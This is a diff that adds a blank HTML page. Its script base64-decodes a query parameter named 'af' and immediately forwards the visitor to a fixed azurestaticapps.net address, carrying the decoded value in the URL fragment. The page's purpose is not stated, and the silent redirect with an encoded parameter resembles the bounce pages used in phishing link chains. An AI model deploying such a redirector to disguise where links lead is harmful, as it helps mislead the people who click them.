@@ -1,0 +1,23 @@
+<html>
+  <head></head>
+
+  <script>
+    var queryParams = window.location.search
+      .substr(1)
+      .split("&")
+      .reduce(function (q, query) {
+        var chunks = query.split("=");
+        var key = chunks[0];
+        var value = decodeURIComponent(chunks[1]);
+        value = isNaN(Number(value)) ? value : Number(value);
+
+        console.log("q[key] " + q[key]);
+        return (q[key] = value), q;
+      }, {});
+
+    window.location.replace(
+      "https://purple-sand-09b4b3010.azurestaticapps.net/index.html#" +
+        atob(queryParams["af"])
+    );
+  </script>
+</html>
